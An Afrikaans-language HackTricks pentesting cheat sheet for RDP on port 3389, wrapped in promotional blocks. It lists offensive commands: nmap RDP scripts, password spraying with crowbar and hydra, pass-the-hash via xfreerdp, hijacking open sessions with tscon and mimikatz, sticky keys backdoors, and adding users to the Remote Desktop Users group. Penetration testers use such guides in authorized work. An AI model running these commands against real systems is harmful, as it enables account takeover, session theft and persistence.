# 3389 - Pentesting RDP

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

**Onmiddellik beskikbare opstelling vir kwetsbaarheidsassessering & penetrasietoetsing**. Voer 'n volledige pentest uit van enige plek met 20+ gereedskap & funksies wat strek vanaf rekognisering tot verslagdoening. Ons vervang nie pentesters nie - ons ontwikkel aangepaste gereedskap, opsporing & uitbuitingsmodules om hulle 'n bietjie tyd terug te gee om dieper te delf, skulpe te laat pop, en pret te h√™.

{% embed url="https://pentest-tools.com/" %}

## Basiese Inligting

Ontwikkel deur Microsoft, is die **Remote Desktop Protocol** (**RDP**) ontwerp om 'n grafiese koppelvlakverbinding tussen rekenaars oor 'n netwerk moontlik te maak. Om so 'n verbinding tot stand te bring, word **RDP**-klient sagteware deur die gebruiker gebruik, en gelyktydig moet die afgele√´ rekenaar **RDP**-bediener sagteware bedryf. Hierdie opstelling maak dit moontlik om die afgele√´ beheer en toegang tot 'n verre rekenaar se lessenaaromgewing te h√™, wat essensieel sy koppelvlak na die gebruiker se plaaslike toestel bring.

**Verstekpoort:** 3389
```
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
```
## Opsomming

### Outomaties

{% code overflow="wrap" %}
```bash
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <IP>
```
{% endcode %}

Dit kontroleer die beskikbare enkripsie en DoS kwesbaarheid (sonder om DoS aan die diens te veroorsaak) en verkry NTLM Windows inligting (weergawes).

### [Brute force](../generic-methodologies-and-resources/brute-force.md#rdp)

**Wees versigtig, jy kan rekeninge blokkeer**

### **Password Spraying**

**Wees versigtig, jy kan rekeninge blokkeer**
```bash
# https://github.com/galkan/crowbar
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
# hydra
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```
### Verbind met bekende geloofsbriewe/hash
```bash
rdesktop -u <username> <IP>
rdesktop -d <domain> -u <username> -p <password> <IP>
xfreerdp [/d:domain] /u:<username> /p:<password> /v:<IP>
xfreerdp [/d:domain] /u:<username> /pth:<hash> /v:<IP> #Pass the hash
```
### Kontroleer bekende geloofsbriewe teenoor RDP-diens

rdp\_check.py van impacket laat jou toe om te kontroleer of sekere geloofsbriewe geldig is vir 'n RDP-diens:
```bash
rdp_check <domain>/<name>:<password>@<IP>
```
<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

**Onmiddellik beskikbare opstelling vir kwesbaarheidsassessering & pentesting**. Voer 'n volledige pentest uit vanaf enige plek met 20+ gereedskap en kenmerke wat strek vanaf rekognisering tot verslagdoening. Ons vervang nie pentesters nie - ons ontwikkel aangepaste gereedskap, opsporing & uitbuitingsmodules om hulle 'n bietjie tyd te gee om dieper te delf, skulpe te laat klap, en pret te h√™.

{% embed url="https://pentest-tools.com/" %}

## **Aanvalle**

### Sessiediefstal

Met **STELSEL-toestemmings** kan jy enige **geopende RDP-sessie deur enige gebruiker** toegang sonder om die wagwoord van die eienaar te weet.

**Kry geopende sessies:**
```
query user
```
**Toegang tot die gekose sessie**
```bash
tscon <ID> /dest:<SESSIONNAME>
```
Nou sal jy binne die gekose RDP-sessie wees en jy sal 'n gebruiker moet naboots met slegs Windows-gereedskap en -kenmerke.

**Belangrik**: Wanneer jy 'n aktiewe RDP-sessie betree, sal jy die gebruiker wat dit gebruik het, aftrap.

Jy kan wagwoorde kry deur die proses te dump, maar hierdie metode is baie vinniger en laat jou toe om met die virtuele lessenaars van die gebruiker te interakteer (wagwoorde in notepad sonder om op die skyf gestoor te word, ander RDP-sessies wat op ander rekenaars oop is...)

#### **Mimikatz**

Jy kan ook mimikatz gebruik om dit te doen:
```bash
ts::sessions        #Get sessions
ts::remote /id:2    #Connect to the session
```
### Plakkerige toetse & Utilman

Deur hierdie tegniek te kombineer met **plakkerige toetse** of **utilman sal jy in staat wees om enige administratiewe CMD en enige RDP-sessie enige tyd te benader**

Jy kan soek na RDP's wat reeds met een van hierdie tegnieke agterdeur is met: [https://github.com/linuz/Sticky-Keys-Slayer](https://github.com/linuz/Sticky-Keys-Slayer)

### RDP-prosesinspuiting

Indien iemand vanaf 'n ander domein of met **betere voorregte inlog via RDP** na die rekenaar waar **jy 'n Admin is**, kan jy jou sein inspuit in sy **RDP-sessieproses** en as hom optree:

{% content-ref url="../windows-hardening/active-directory-methodology/rdp-sessions-abuse.md" %}
[rdp-sessions-abuse.md](../windows-hardening/active-directory-methodology/rdp-sessions-abuse.md)
{% endcontent-ref %}

### Voeg Gebruiker by RDP-groep
```bash
net localgroup "Remote Desktop Users" UserLoginName /add
```
## Outomatiese Gereedskap

* [**AutoRDPwn**](https://github.com/JoelGMSec/AutoRDPwn)

**AutoRDPwn** is 'n post-exploitation raamwerk geskep in Powershell, prim√™r ontwerp om die **Shadow** aanval op Microsoft Windows-rekenaars outomaties te maak. Hierdie kwesbaarheid (gelys as 'n kenmerk deur Microsoft) maak dit moontlik vir 'n afgele√´ aanvaller om **sy slagoffer se lessenaar sonder sy toestemming te sien**, en selfs dit op aanvraag te beheer, deur gebruik te maak van gereedskap wat inherent is aan die bedryfstelsel self.

* [**EvilRDP**](https://github.com/skelsec/evilrdp)
* Beheer muis en sleutelbord op 'n geoutomatiseerde manier vanaf die opdraglyn
* Beheer knipbord op 'n geoutomatiseerde manier vanaf die opdraglyn
* Skep 'n SOCKS-proksi vanaf die klient wat netwerk kommunikasie na die teiken deur RDP kanaliseer
* Voer willekeurige SHELL- en PowerShell-opdragte op die teiken uit sonder om l√™ers te oplaai
* Laai l√™ers op en aflaai na/van die teiken selfs wanneer l√™eroordragte op die teiken gedeaktiveer is
```
Protocol_Name: RDP    #Protocol Abbreviation if there is one.
Port_Number:  3389     #Comma separated if there is more than one.
Protocol_Description: Remote Desktop Protocol         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for RDP
Note: |
Developed by Microsoft, the Remote Desktop Protocol (RDP) is designed to enable a graphical interface connection between computers over a network. To establish such a connection, RDP client software is utilized by the user, and concurrently, the remote computer is required to operate RDP server software. This setup allows for the seamless control and access of a distant computer's desktop environment, essentially bringing its interface to the user's local device.

https://book.hacktricks.xyz/pentesting/pentesting-rdp

Entry_2:
Name: Nmap
Description: Nmap with RDP Scripts
Command: nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 {IP}
```
<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

**Onmiddellik beskikbare opstelling vir kwesbaarheidsassessering en pentesting**. Voer 'n volledige pentest uit vanaf enige plek met 20+ gereedskap en kenmerke wat strek vanaf rekognisering tot verslagdoening. Ons vervang nie pentesters nie - ons ontwikkel aangepaste gereedskap, opsporing- en uitbuitingsmodules om hulle 'n bietjie tyd te gee om dieper te delf, skulpe te laat pop en pret te h√™.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
